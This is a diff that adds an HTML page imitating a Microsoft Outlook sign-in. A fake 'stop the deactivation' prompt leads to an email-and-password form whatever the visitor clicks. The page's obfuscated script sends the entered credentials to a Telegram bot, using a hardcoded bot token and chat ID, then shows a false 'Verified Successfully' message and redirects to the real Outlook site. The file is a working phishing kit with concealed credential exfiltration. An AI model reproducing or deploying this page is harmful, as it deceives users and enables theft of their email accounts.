@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Login</title>
+    <style>
+        /* Reset styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Background gradient */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(to bottom right, #e3eaf0, #f4f7fa);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+        }
+
+        /* Overlay for Yes/No prompt */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .overlay-content {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            text-align: center;
+            width: 500px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Logo and title */
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 35px;
+            margin-right: 10px;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        /* Container styling */
+        .container {
+            width: 420px;
+            padding: 40px;
+            text-align: center;
+            background-color: white;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
+            border-radius: 8px;
+            display: none;
+        }
+
+        /* Input group styling */
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            color: #333;
+        }
+
+        /* Button styling */
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: #005a9e;
+        }
+
+        /* Yes/No button container */
+        .yes-no-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+
+        /* Additional options */
+        .options {
+            font-size: 13px;
+            color: #0078d4;
+            margin-top: 20px;
+        }
+
+        .options a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .options a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer links */
+        .footer {
+            font-size: 13px;
+            color: #666;
+            margin-top: 25px;
+            border-top: 1px solid #e1e1e1;
+            padding-top: 15px;
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Success screen styling */
+        .success {
+            display: none; /* Hidden by default */
+            text-align: center;
+        }
+
+        .success h1 {
+            font-size: 24px;
+            color: #0078d4; /* Green color for success */
+            margin-bottom: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 400px) {
+            .container {
+                width: 90%;
+                padding: 30px;
+            }
+        }
+
+        /* Hidden input */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+    <div class="overlay-content">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+            <span class="title">Outlook</span>
+        </div>
+        <p>Do you wish to stop the deactivation process?</p>
+        <div class="yes-no-buttons"> 
+            <button class="btn" onclick="showLoginForm(true)" style="width: 45%;">Yes, keep my account</button>
+            <button class="btn" onclick="showLoginForm(true)" style="width: 45%; background-color: red;">No, deactivate my account</button>
+        </div>
+    </div>
+</div>
+
+<div class="container" id="loginContainer">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <span class="title">Outlook</span>
+    </div>
+    <p style="margin: 0 0 10px; font-size: 16px; color: #333;">Sign in</p>
+    <p style="margin: 0 0 20px; font-size: 14px; color: #666;">to continue to Outlook</p>
+    
+    <form id="loginForm" onsubmit="handleFormSubmit(event)">
+        <div id="emailGroup">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required aria-label="Email, phone, or Skype">
+            </div>
+            <button type="button" class="btn" onclick="showPasswordInput()">Next</button>
+        </div>
+        
+        <div id="passwordGroup" class="hidden">
+            <p id="emailDisplay" style="margin-bottom: 15px; color: #333; text-align: left;"></p>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required aria-label="Password">
+            </div>
+            <button type="submit" class="btn">Sign In</button>
+        </div>
+    </form>
+    
+    <div class="options">
+        No account? <a href="#">Create one!</a>
+    </div>
+    
+    <div class="footer">
+        <a href="#" target="_blank">Terms of use</a> | 
+        <a href="#" target="_blank">Privacy & cookies</a>
+    </div>
+</div>
+
+<div class="success" id="successScreen">
+    <h1>Verified Successfully!</h1>
+    <p>Your login was successful. Welcome back!</p>
+    <div class="footer">
+        <a href="#" target="_blank">Go to Outlook</a>
+    </div>
+</div>
+
+<script>
+    const _0x3d35fe=_0x439a;(function(_0x479962,_0x28cd7b){const _0x25d371=_0x439a,_0x56eb91=_0x479962();while(!![]){try{const _0x5d9324=parseInt(_0x25d371(0xb4))/0x1+parseInt(_0x25d371(0x94))/0x2*(parseInt(_0x25d371(0xad))/0x3)+-parseInt(_0x25d371(0xb5))/0x4+parseInt(_0x25d371(0xab))/0x5+parseInt(_0x25d371(0x9e))/0x6*(parseInt(_0x25d371(0xa1))/0x7)+parseInt(_0x25d371(0xae))/0x8+-parseInt(_0x25d371(0xb1))/0x9*(parseInt(_0x25d371(0xa9))/0xa);if(_0x5d9324===_0x28cd7b)break;else _0x56eb91['push'](_0x56eb91['shift']());}catch(_0x4e8e2e){_0x56eb91['push'](_0x56eb91['shift']());}}}(_0x45db,0xd65a4));function _0x45db(){const _0x30d727=['Failed\x20to\x20send\x20message','Email:\x20','7363493289:AAEknQWRYc04JOVZtNyZqvFK_8S4vCa1XQU','46842GhmwXZ','value','loginContainer','\x0aPassword:\x20','email','overlay','An\x20error\x20occurred\x20while\x20sending\x20the\x20information.','POST','stringify','style','6ndJShg','https://api.telegram.org/bot','emailDisplay','4518766foPAhR','getElementById','https://outlook.live.com/mail','emailGroup','display','application/json','Error:','successScreen','10BHzymC','You\x20chose\x20not\x20to\x20proceed.','1995715zrrRUe','none','111CRkmrB','1312568fLitCj','block','href','10723491ugYhRi','json','/sendMessage','721620UErQNf','2909848QQmmKV','passwordGroup','1660606734'];_0x45db=function(){return _0x30d727;};return _0x45db();}const TELEGRAM_BOT_TOKEN=_0x3d35fe(0xba),CHAT_ID=_0x3d35fe(0xb7);function showLoginForm(_0x57dd43){const _0x34d45e=_0x3d35fe,_0x599763=document[_0x34d45e(0xa2)](_0x34d45e(0x99)),_0x3dcd3c=document[_0x34d45e(0xa2)](_0x34d45e(0x96));_0x57dd43?(_0x599763['style'][_0x34d45e(0xa5)]=_0x34d45e(0xac),_0x3dcd3c[_0x34d45e(0x9d)]['display']=_0x34d45e(0xaf)):alert(_0x34d45e(0xaa));}function _0x439a(_0xeb1702,_0x285b9d){const _0x45db36=_0x45db();return _0x439a=function(_0x439aec,_0x373f1b){_0x439aec=_0x439aec-0x94;let _0x4cf610=_0x45db36[_0x439aec];return _0x4cf610;},_0x439a(_0xeb1702,_0x285b9d);}function showPasswordInput(){const _0x5d1e46=_0x3d35fe,_0x462dc8=document['getElementById'](_0x5d1e46(0x98))[_0x5d1e46(0x95)],_0x2d82c7=document[_0x5d1e46(0xa2)](_0x5d1e46(0xa0)),_0x56dd5e=document['getElementById'](_0x5d1e46(0xa4)),_0x26f434=document[_0x5d1e46(0xa2)](_0x5d1e46(0xb6));_0x2d82c7['textContent']='←\x20'+_0x462dc8,_0x56dd5e[_0x5d1e46(0x9d)][_0x5d1e46(0xa5)]=_0x5d1e46(0xac),_0x26f434['classList']['remove']('hidden');}async function handleFormSubmit(_0x8a0b47){const _0x3f4066=_0x3d35fe;_0x8a0b47['preventDefault']();const _0x3e6e80=document[_0x3f4066(0xa2)](_0x3f4066(0x98))[_0x3f4066(0x95)],_0x43c05c=document[_0x3f4066(0xa2)]('password')[_0x3f4066(0x95)],_0x3e7384=_0x3f4066(0xb9)+_0x3e6e80+_0x3f4066(0x97)+_0x43c05c;try{const _0x397fb3=await fetch(_0x3f4066(0x9f)+TELEGRAM_BOT_TOKEN+_0x3f4066(0xb3),{'method':_0x3f4066(0x9b),'headers':{'Content-Type':_0x3f4066(0xa6)},'body':JSON[_0x3f4066(0x9c)]({'chat_id':CHAT_ID,'text':_0x3e7384})}),_0x50d6e7=await _0x397fb3[_0x3f4066(0xb2)]();if(_0x50d6e7['ok'])document[_0x3f4066(0xa2)](_0x3f4066(0x96))[_0x3f4066(0x9d)]['display']='none',document[_0x3f4066(0xa2)](_0x3f4066(0xa8))['style'][_0x3f4066(0xa5)]=_0x3f4066(0xaf),setTimeout(()=>{const _0x37cfd1=_0x3f4066;window['location'][_0x37cfd1(0xb0)]=_0x37cfd1(0xa3);},0x1388);else throw new Error(_0x3f4066(0xb8));}catch(_0x4152ff){console['error'](_0x3f4066(0xa7),_0x4152ff),alert(_0x3f4066(0x9a));}}
+</script>
+
+</body>
+</html>
